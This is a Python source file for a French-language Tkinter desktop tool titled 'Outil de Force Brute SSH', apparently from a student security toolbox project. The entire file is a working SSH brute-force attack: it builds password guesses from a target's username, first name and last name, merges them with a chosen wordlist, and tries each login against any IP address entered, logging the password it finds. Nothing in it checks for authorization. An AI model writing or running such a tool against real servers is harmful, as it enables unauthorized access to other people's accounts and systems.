import paramiko  # type: ignore
import tkinter as tk
from tkinter import filedialog, messagebox
import threading
import os

def generate_password_variants(username, firstname, lastname):
    variants = [
        username, firstname, lastname,
        username + '123', firstname + '123', lastname + '123',
        username + '!', firstname + '!', lastname + '!',
        username + '2023', firstname + '2023', lastname + '2023',
        username + '1234', firstname + '1234', lastname + '1234',
        '123' + username, '123' + firstname, '123' + lastname,
        '!' + username, '!' + firstname, '!' + lastname,
        username.capitalize(), firstname.capitalize(), lastname.capitalize(),
        username[::-1], firstname[::-1], lastname[::-1],
        username + '01', firstname + '01', lastname + '01',
        username + '02', firstname + '02', lastname + '02',
        username + '03', firstname + '03', lastname + '03',
        username + '_123', firstname + '_123', lastname + '_123',
        username + '_!', firstname + '_!', lastname + '_!',
        username + '_2023', firstname + '_2023', lastname + '_2023',
        username + '_2024', firstname + '_2024', lastname + '_2024',
        username + 'password', firstname + 'password', lastname + 'password',
        'password' + username, 'password' + firstname, 'password' + lastname,
        username + '01!', firstname + '01!', lastname + '01!',
        username + '02!', firstname + '02!', lastname + '02!',
        username + '03!', firstname + '03!', lastname + '03!',
        username + 'admin', firstname + 'admin', lastname + 'admin',
        username + 'admin123', firstname + 'admin123', lastname + 'admin123',
        'admin' + username, 'admin' + firstname, 'admin' + lastname,
        username + 'root', firstname + 'root', lastname + 'root',
        'root' + username, 'root' + firstname, 'root' + lastname,
        username + 'user', firstname + 'user', lastname + 'user',
        'user' + username, 'user' + firstname, 'user' + lastname,
        username + 'test', firstname + 'test', lastname + 'test',
        'test' + username, 'test' + firstname, 'test' + lastname,
        username + '_test', firstname + '_test', lastname + '_test',
        'test_' + username, 'test_' + firstname, 'test_' + lastname,
        username + 'guest', firstname + 'guest', lastname + 'guest',
        'guest' + username, 'guest' + firstname, 'guest' + lastname,
        username + 'guest123', firstname + 'guest123', lastname + 'guest123',
        'guest123' + username, 'guest123' + firstname, 'guest123' + lastname,
        username + '!' + '2023', firstname + '!' + '2023', lastname + '!' + '2023',
        username + '!' + '2024', firstname + '!' + '2024', lastname + '!' + '2024',
        username + '!' + '1234', firstname + '!' + '1234', lastname + '!' + '1234',
        username + '!' + 'password', firstname + '!' + 'password', lastname + '!' + 'password'
    ]
    return variants

def ssh_brute_force(ip, username, firstname, lastname, password_file, output_text):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        with open(password_file, 'r') as file:
            passwords = file.readlines()
    except FileNotFoundError:
        output_text.insert(tk.END, "[!] Fichier de mots de passe non trouvé.\n")
        return None
    except Exception as e:
        output_text.insert(tk.END, f"[!] Erreur lors de la lecture du fichier de mots de passe : {e}\n")
        return None

    password_variants = generate_password_variants(username, firstname, lastname)
    all_passwords = password_variants + [pwd.strip() for pwd in passwords]

    log_content = ""
    for password in all_passwords:
        try:
            ssh.connect(ip, username=username, password=password)
            log_content += f"[+] Mot de passe trouvé : {password}\n"
            output_text.insert(tk.END, f"[+] Mot de passe trouvé : {password}\n")
            break
        except paramiko.AuthenticationException:
            log_content += f"[-] Mot de passe échoué : {password}\n"
            output_text.insert(tk.END, f"[-] Mot de passe échoué : {password}\n")
        except paramiko.SSHException as sshException:
            log_content += f"[!] Erreur SSH : {sshException}\n"
            output_text.insert(tk.END, f"[!] Erreur SSH : {sshException}\n")
            break
        except Exception as e:
            log_content += f"[!] Erreur inattendue : {e}\n"
            output_text.insert(tk.END, f"[!] Erreur inattendue : {e}\n")
            break
        finally:
            ssh.close()

    save_log(log_content)

def save_log(content):
    log_dir = r"C:\Users\ishak\Documents\ESI-2023-2024\Projet-Tool-Box\result-bruteforce"
    os.makedirs(log_dir, exist_ok=True)
    log_path = os.path.join(log_dir, "bruteforce_log.txt")

    with open(log_path, 'w') as log_file:
        log_file.write(content)

    if messagebox.askyesno("Log Enregistré", "Le fichier log est enregistré. Voulez-vous l'ouvrir ?"):
        os.startfile(log_path)
    else:
        if messagebox.askyesno("Log Enregistré", "Le fichier log est enregistré. Voulez-vous le supprimer ?"):
            os.remove(log_path)
            messagebox.showinfo("Log Supprimé", "Le fichier log a été supprimé.")
        else:
            messagebox.showinfo("Log Conserve", f"Le fichier log est enregistré à l'adresse : {log_path}")

def start_bruteforce():
    ip = ip_entry.get()
    username = username_entry.get()
    firstname = firstname_entry.get()
    lastname = lastname_entry.get()
    password_file = password_file_path.get()

    if not ip or not username or not firstname or not lastname:
        messagebox.showerror("Erreur de Saisie", "Veuillez remplir tous les champs.")
        return

    output_text.delete(1.0, tk.END)
    threading.Thread(target=ssh_brute_force, args=(ip, username, firstname, lastname, password_file, output_text)).start()

def browse_file():
    file_path = filedialog.askopenfilename()
    password_file_path.set(file_path)

# Interface utilisateur Tkinter
root = tk.Tk()
root.title("Outil de Force Brute SSH")
root.configure(bg='darkblue')

tk.Label(root, text="Adresse IP :", bg='darkblue', fg='white').grid(row=0, column=0, padx=10, pady=5)
ip_entry = tk.Entry(root)
ip_entry.grid(row=0, column=1, padx=10, pady=5)

tk.Label(root, text="Nom d'utilisateur :", bg='darkblue', fg='white').grid(row=1, column=0, padx=10, pady=5)
username_entry = tk.Entry(root)
username_entry.grid(row=1, column=1, padx=10, pady=5)

tk.Label(root, text="Prénom :", bg='darkblue', fg='white').grid(row=2, column=0, padx=10, pady=5)
firstname_entry = tk.Entry(root)
firstname_entry.grid(row=2, column=1, padx=10, pady=5)

tk.Label(root, text="Nom :", bg='darkblue', fg='white').grid(row=3, column=0, padx=10, pady=5)
lastname_entry = tk.Entry(root)
lastname_entry.grid(row=3, column=1, padx=10, pady=5)

tk.Label(root, text="Fichier de mots de passe :", bg='darkblue', fg='white').grid(row=4, column=0, padx=10, pady=5)
password_file_path = tk.StringVar()
password_file_entry = tk.Entry(root, textvariable=password_file_path)
password_file_entry.grid(row=4, column=1, padx=10, pady=5)
browse_button = tk.Button(root, text="Parcourir", command=browse_file, bg='#3498db', fg='white')
browse_button.grid(row=4, column=2, padx=10, pady=5)

start_button = tk.Button(root, text="Démarrer la Force Brute", command=start_bruteforce, bg='#3498db', fg='white')
start_button.grid(row=5, column=1, pady=10)

output_text = tk.Text(root, height=15, width=70, bg='lightgrey', fg='black')
output_text.grid(row=6, column=0, columnspan=3, padx=10, pady=10)

root.mainloop()
